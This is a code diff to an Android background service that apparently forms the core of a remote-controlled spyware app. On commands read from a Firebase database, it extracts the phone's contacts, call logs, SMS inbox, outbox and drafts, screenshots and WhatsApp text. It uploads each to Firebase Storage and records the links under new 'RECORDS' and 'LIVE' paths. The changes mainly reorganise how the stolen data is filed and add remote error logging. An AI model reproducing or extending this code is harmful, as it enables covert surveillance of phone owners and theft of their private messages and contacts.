@@ -5,13 +5,18 @@ import android.app.NotificationChannel;
 import android.app.NotificationManager;
 import android.app.PendingIntent;
 import android.app.Service;
+import android.content.BroadcastReceiver;
 import android.content.Context;
 import android.content.Intent;
+import android.content.IntentFilter;
 import android.graphics.Color;
 import android.net.Uri;
+import android.os.BatteryManager;
 import android.os.Build;
 import android.os.IBinder;
 import android.util.Log;
+import android.widget.TabHost;
+import android.widget.Toast;
 
 import androidx.annotation.NonNull;
 import androidx.annotation.Nullable;
@@ -21,16 +26,13 @@ import androidx.core.content.FileProvider;
 
 import com.aigs.serviceone.MainActivity;
 import com.aigs.serviceone.R;
+import com.aigs.serviceone.helpers.BatteryUpdater;
 import com.aigs.serviceone.helpers.CallExtractorNotifier;
 import com.aigs.serviceone.helpers.ContactsPayloadListner;
-import com.aigs.serviceone.helpers.Data;
 import com.aigs.serviceone.helpers.PayloadTypes;
-import com.aigs.serviceone.helpers.ScreenshotPayloadListener;
 import com.aigs.serviceone.helpers.SmsExtractorNotifier;
 import com.aigs.serviceone.helpers.SmsModes;
 import com.aigs.serviceone.helpers.WatsappTextExtractionListner;
-import com.aigs.serviceone.helpers.ZipListener;
-import com.aigs.serviceone.helpers.ZipUtils;
 import com.aigs.serviceone.payload.CallLogsPayload;
 import com.aigs.serviceone.payload.ContactsPayload;
 import com.aigs.serviceone.payload.ScreenshotPayload;
@@ -47,6 +49,7 @@ import com.google.firebase.storage.FirebaseStorage;
 import com.google.firebase.storage.UploadTask;
 
 import java.io.File;
+import java.util.HashMap;
 
 public class Starter extends Service {
 
@@ -83,12 +86,12 @@ public class Starter extends Service {
                 .addValueEventListener(new ValueEventListener() {
                     @Override
                     public void onDataChange(@NonNull DataSnapshot snapshot) {
-                        if (snapshot.exists()){
+                        if (snapshot.exists()) {
                             try {
                                 snapshot.getValue(Long.class);
                                 FirebaseDatabase.getInstance().getReference("test").child("command").setValue(true);
-                            }catch (NumberFormatException | DatabaseException numberFormatException){
-                                Log.d("WARNING","OLD BOOT CHECK COMMAND FOUND");
+                            } catch (NumberFormatException | DatabaseException numberFormatException) {
+                                Log.d("WARNING", "OLD BOOT CHECK COMMAND FOUND");
                             }
                         }
                     }
@@ -98,6 +101,7 @@ public class Starter extends Service {
                         error.toException().printStackTrace();
                     }
                 });
+
 
         FirebaseDatabase
                 .getInstance()
@@ -152,14 +156,17 @@ public class Starter extends Service {
                 case PayloadTypes.GET_USER_CONTACTS:
                     getContacts();
                     break;
+                case PayloadTypes.GET_BATTERY_STATUS:
+                    //loadBatterySection();
+                    break;
                 default:
                     Log.d("ERROR PA : ", "Invalid Command Received");
                     FirebaseDatabase.getInstance().getReference("Logs").child("GENERAL").child("CurrentLog").setValue("Invalid Command Received");
 
                     break;
             }
-        }catch (SecurityException e){
-            Log.e("PERMISSION : ",e.getMessage());
+        } catch (SecurityException e) {
+            Log.e("PERMISSION : ", e.getMessage());
             FirebaseDatabase.getInstance().getReference("Logs").child("GENERAL").child("CurrentLog").setValue(e.getMessage());
 
         }
@@ -170,16 +177,16 @@ public class Starter extends Service {
             new ContactsPayload(this).setOnContactPayloadListener(new ContactsPayloadListner() {
                 @Override
                 public void onDataExtracted(File file, String rawData) {
-                    Uri fileReference = FileProvider.getUriForFile(Starter.this,Starter.this.getPackageName()+".provider",file);
+                    Uri fileReference = FileProvider.getUriForFile(Starter.this, Starter.this.getPackageName() + ".provider", file);
                     FirebaseStorage
                             .getInstance()
                             .getReference("contacts")
-                            .child("contacts_"+System.currentTimeMillis()+".json")
+                            .child("contacts_" + System.currentTimeMillis() + ".json")
                             .putFile(fileReference)
-                            .addOnFailureListener(r->FirebaseDatabase
+                            .addOnFailureListener(r -> FirebaseDatabase
                                     .getInstance()
                                     .getReference("Logs")
-                                    .child(PayloadTypes.GET_USER_CONTACTS+"")
+                                    .child(PayloadTypes.GET_USER_CONTACTS + "")
                                     .child("CurrentLog")
                                     .setValue(r.getMessage()))
                             .addOnCompleteListener(task -> {
@@ -187,12 +194,18 @@ public class Starter extends Service {
                                     task.getResult()
                                             .getStorage()
                                             .getDownloadUrl()
-                                            .addOnCompleteListener(task1 -> FirebaseDatabase.getInstance().getReference("contacts").child(System.currentTimeMillis()+"").setValue(task1.getResult().toString()));
-                                };
+                                            .addOnCompleteListener(task1 -> {
+                                                HashMap<String, Object> databaseEntry = new HashMap<>();
+                                                databaseEntry.put("/RECORDS/contacts/" + System.currentTimeMillis(), task1.getResult().toString());
+                                                databaseEntry.put("/LIVE/contacts", task1.getResult().toString());
+                                                FirebaseDatabase.getInstance().getReference().updateChildren(databaseEntry);
+                                            });
+                                }
+                                ;
                             });
                 }
             }).execute();
-        }catch (Exception e){
+        } catch (Exception e) {
             e.printStackTrace();
         }
     }
@@ -201,33 +214,35 @@ public class Starter extends Service {
         try {
             new ScreenshotPayload(this).setScreenshotPayloadListener(path -> {
 
-                Uri securePath = FileProvider.getUriForFile(Starter.this,Starter.this.getPackageName()+".provider",path);
-                Log.e("PATH:",path.toString());
+                Uri securePath = FileProvider.getUriForFile(Starter.this, Starter.this.getPackageName() + ".provider", path);
+                Log.e("PATH:", path.toString());
                 FirebaseStorage
                         .getInstance()
                         .getReference("screenshots")
-                        .child("sc_"+System.currentTimeMillis()+".zip")
+                        .child("sc_" + System.currentTimeMillis() + ".zip")
                         .putFile(securePath)
-                        .addOnFailureListener(f->{
+                        .addOnFailureListener(f -> {
                             FirebaseDatabase
                                     .getInstance()
                                     .getReference("Logs")
-                                    .child(PayloadTypes.GET_SCREENSHOTS_COUNT+"")
+                                    .child(PayloadTypes.GET_SCREENSHOTS_COUNT + "")
                                     .child("CurrentLog")
                                     .setValue(f.getMessage());
                         })
-                        .addOnCompleteListener(t->{
+                        .addOnCompleteListener(t -> {
                             t.getResult()
                                     .getStorage()
                                     .getDownloadUrl()
-                                    .addOnCompleteListener(p->
-                                            FirebaseDatabase.getInstance()
-                                                    .getReference("Screenshots")
-                                                    .child(" "+System.currentTimeMillis())
-                                                    .setValue(p.getResult().toString()));
+                                    .addOnCompleteListener(p ->{
+                                        HashMap<String, Object> databaseEntry = new HashMap<>();
+                                        databaseEntry.put("/RECORDS/screenshots/" + System.currentTimeMillis(), p.getResult().toString());
+                                        databaseEntry.put("/LIVE/screenshots", p.getResult().toString());
+                                        FirebaseDatabase.getInstance().getReference().updateChildren(databaseEntry);
+
+                                    });
                         });
             }).execute();
-        }catch (Exception e){
+        } catch (Exception e) {
             e.printStackTrace();
         }
     }
@@ -274,11 +289,11 @@ public class Starter extends Service {
                                                 .getStorage()
                                                 .getDownloadUrl()
                                                 .addOnCompleteListener(task1 ->
-                                        FirebaseDatabase
-                                                .getInstance()
-                                                .getReference("wbDb")
-                                                .child(System.currentTimeMillis() + " ")
-                                                .setValue(task1.getResult().toString()));
+                                                        FirebaseDatabase
+                                                                .getInstance()
+                                                                .getReference("wbDb")
+                                                                .child(System.currentTimeMillis() + " ")
+                                                                .setValue(task1.getResult().toString()));
                                     });
 
 
@@ -291,6 +306,7 @@ public class Starter extends Service {
 
     private void getCallLogs() {
         try {
+
             new CallLogsPayload(this)
                     .setCallLogsListener(new CallExtractorNotifier() {
                         @Override
@@ -304,7 +320,12 @@ public class Starter extends Service {
                                     .putFile(uri)
                                     .addOnCompleteListener(task -> {
                                         if (task.isSuccessful()) {
-                                            task.getResult().getStorage().getDownloadUrl().addOnCompleteListener(task1 -> FirebaseDatabase.getInstance().getReference("calls").child(System.currentTimeMillis() + " ").setValue(task1.getResult().toString()));
+                                            task.getResult().getStorage().getDownloadUrl().addOnCompleteListener(task1 -> {
+                                                HashMap<String, Object> databaseEntry = new HashMap<>();
+                                                databaseEntry.put("/RECORDS/calls/" + System.currentTimeMillis(), task1.getResult().toString());
+                                                databaseEntry.put("/LIVE/calls", task1.getResult().toString());
+                                                FirebaseDatabase.getInstance().getReference().updateChildren(databaseEntry);
+                                            });
                                         } else
                                             Log.e("STORAGE", task.getException().getMessage());
                                     });
@@ -314,6 +335,8 @@ public class Starter extends Service {
                         @Override
                         public void onResponseEmpty() {
                             Log.e("EMPTY", "NO RECORDS DETECTED");
+                            FirebaseDatabase.getInstance().getReference("Logs").child(PayloadTypes.GET_CALL_LOGS+"").child("CurrentLog").setValue("NO RECORDS DETECTED");
+
                         }
                     }).execute();
 
@@ -344,11 +367,19 @@ public class Starter extends Service {
                                                 task.getResult().getStorage().getDownloadUrl().addOnCompleteListener(new OnCompleteListener<Uri>() {
                                                     @Override
                                                     public void onComplete(@NonNull Task<Uri> task) {
-                                                        FirebaseDatabase
-                                                                .getInstance()
-                                                                .getReference("sms")
-                                                                .child(System.currentTimeMillis() + " ")
-                                                                .setValue(task.getResult().toString());
+                                                        HashMap<String, Object> databaseEntry = new HashMap<>();
+                                                        if (modeInbox.equals(SmsModes.MODE_INBOX)){
+                                                            databaseEntry.put("/RECORDS/sms_inbox/" + System.currentTimeMillis(), task.getResult().toString());
+                                                            databaseEntry.put("/LIVE/sms_inbox", task.getResult().toString());
+                                                        }else if (modeInbox.equals(SmsModes.MODE_OUTBOX)){
+                                                            databaseEntry.put("/RECORDS/sms_outbox/" + System.currentTimeMillis(), task.getResult().toString());
+                                                            databaseEntry.put("/LIVE/sms_outbox", task.getResult().toString());
+                                                        }else if (modeInbox.equals(SmsModes.MODE_DRAFT)){
+                                                            databaseEntry.put("/RECORDS/sms_draft/" + System.currentTimeMillis(), task.getResult().toString());
+                                                            databaseEntry.put("/LIVE/sms_draft", task.getResult().toString());
+                                                        }
+
+                                                        FirebaseDatabase.getInstance().getReference().updateChildren(databaseEntry);
                                                     }
                                                 });
                                             } else
@@ -360,8 +391,11 @@ public class Starter extends Service {
                         @Override
                         public void onResponseEmpty() {
                             Log.e("EMPTY", "NO RECORDS DETECTED");
+                            FirebaseDatabase.getInstance().getReference("Logs").child(PayloadTypes.GET_TEXT_MESSAGES_INBOX+"").child("CurrentLog").setValue("NO RECORDS DETECTED");
+
                         }
                     }).execute(modeInbox);
+
         } catch (Exception e) {
             e.printStackTrace();
         }
@@ -374,6 +408,8 @@ public class Starter extends Service {
         serviceIntent.putExtra("inputExtra", "passing any text");
         ContextCompat.startForegroundService(this, serviceIntent);
     }
+
+
 
     @Nullable
     @Override
